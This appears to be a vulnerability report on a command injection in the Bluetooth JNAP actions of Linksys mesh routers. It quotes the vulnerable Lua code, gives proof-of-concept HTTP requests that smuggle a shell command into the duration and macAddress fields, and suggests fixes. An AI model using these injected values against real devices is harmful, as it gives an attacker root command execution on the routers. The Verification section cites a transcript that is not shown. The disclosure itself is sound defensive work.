# Linksys MBE7000 and LN1400 1.0.14 were discovered to contain a command injection vulnerability in the JNAP BTSelfDisconnect action

## Overview

- Vendor: Linksys (Belkin)
- Product: MBE7000 1.0.14.216607, LN1400 1.0.14.216698, MX6200
- Version: 1.0.14
- Component: JNAP action BTSelfDisconnect
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative): 7.2 High `AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (administrator JNAP credential/session required; commands run as root)
- Manufacturer: https://www.linksys.com/

## Affected versions / hashes

- MBE7000 1.0.14.216607 image.
  SquashFS at `0x800000`.
- LN1400 1.0.14.216698 image.
  SquashFS at `0x800000`.
- MX6200 1.0.14.216738 image.
  contain the same `SYSEVENT_BT_SETUP_RESTART` and `btGetDeviceID`
  paths. `BTSelfDisconnect` action flags are `0x4` and `GetDeviceID`
  flags are `0xc` (admin authentication).

## Vulnerability details

`BTSelfDisconnect` forwards `input.duration` to
`btSelfDisconnect`, which formats it directly into a shell command:

```lua
-- usr/local/lib/lua/5.1/bluetooth.lua
_M.SYSEVENT_BT_SETUP_RESTART = 'sysevent set btsetup-restart-with-duration %s > /dev/null 2>&1'
...
function _M.btSelfDisconnect(sc, input)
    local timeout = input.duration;
    if not timeout or timeout == "" then
        timeout = tostring(5);
    end
    os.execute(_M.SYSEVENT_BT_SETUP_RESTART:format(timeout))
    return nil
end
```

`duration` is not converted to a number, quoted or validated (unlike
the scan actions, which check `0 <= duration <= 30`). A value such as
`;id>/tmp/bt_pwn;#` produces:

```sh
sysevent set btsetup-restart-with-duration ;id>/tmp/bt_pwn;# > /dev/null 2>&1
```

and the second command runs in the JNAP CGI's root context. A local
`/bin/sh` run of the exact generated command created the marker.

A second action reaches the same unquoted-argument pattern:

```lua
-- setup.getDeviceID
local error, data = bluetooth.btGetDeviceID(tostring(input.macAddress))
-- bluetooth.btGetDeviceID
local opt = '-i '..mac
local error, output = btRunCentralCommandSync(opt)  -- io.popen('btsetup_central -i <mac>')
```

`GetDeviceID` (`input.macAddress`) and `BTSelfDisconnect`
(`input.duration`) are both JSON string fields in the JNAP module; no
MAC/UUID/numeric validation is performed before the shell call. Both
actions require an administrator JNAP credential/session.

## PoC

```http
POST /JNAP/ HTTP/1.1
Host: <router>
Content-Type: application/json
X-JNAP-Action: http://linksys.com/jnap/nodes/bluetooth/BTSelfDisconnect
X-JNAP-Authorization: Basic <base64(admin:password)>

{"duration":";id>/tmp/bt_pwn;#"}
```

Then check the marker:

```sh
cat /tmp/bt_pwn
```

The parallel `GetDeviceID` request is:

```json
{"macAddress":";id>/tmp/bt_pwn;#"}
```

with `X-JNAP-Action: http://linksys.com/jnap/nodes/setup/GetDeviceID`.

A third action, `http://linksys.com/jnap/nodes/btsmartconnect/BTRequestGetSlaveSetupStatus`
(flags `0xc`), calls `btGetSlaveSetupStatus[2]` with
`tostring(input.deviceID)`; that function builds
`'-g -U %s -J %s'` and runs `btsetup_central` via `io.popen`, so a
`deviceID` containing a shell metacharacter is likewise unquoted.

`http://linksys.com/jnap/nodes/bluetooth/BTRequestConnect` and
`BTRequestConnect2` (flags `0xc`) pass `tostring(input.macAddress)` to
`btConnect[2]`, which builds `-c <macAddress>` for
`run_central[2].sh %s &`; the MAC string is not validated or quoted.

## Verification

The vulnerable handler in the stock `JNAP action BTSelfDisconnect` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

An authenticated administrator, or anyone with a stolen administrator
token, can execute arbitrary commands as root through the Bluetooth
self-disconnect action (and through the `GetDeviceID` MAC argument).
The affected actions are normal authenticated JNAP endpoints on all
three mesh-router models.

## Remediation / known-CVE relation

- Convert `duration` to a bounded integer before use and reject
  non-numeric values; pass it as an argv element, not a shell string.
- Validate `macAddress` as a MAC address and quote it in
  `btsetup_central -i <mac>`.
- NVD keyword searches on 2026-11-08 for `BTSelfDisconnect`,
  `btsetup-restart-with-duration`, `btGetDeviceID` and
  `Linksys Bluetooth command injection` returned zero results.
  CVE-2026-6992 covers a different Bluetooth action
  (`BTRequestGetSmartConnectStatus` `pin`); this report is a distinct
  sink. Candidate 0-day; no CVE assigned and no vendor contact has been
  made.

## Additional Information

```markdown
### Vendor
Linksys (Belkin)

### Product
MBE7000 1.0.14.216607, LN1400 1.0.14.216698, MX6200

### Version or Commit
1.0.14

### Vulnerability Class
CWE-78 command injection

### Description
The JNAP BTSelfDisconnect action formats input.duration directly into a shell command in btSelfDisconnect; no validation is applied.

### Affected_component
JNAP action BTSelfDisconnect

### Attack_vector
Authenticated JNAP BTSelfDisconnect with a crafted input.duration.

### Product_version
MBE7000 1.0.14.216607, LN1400 1.0.14.216698, MX6200 1.0.14

### Reference
- https://www.linksys.com/
- https://github.com/vuln-1/vuln/blob/main/Linksys/MBE7000_LN1400_V1.0.14/report-1.md
```
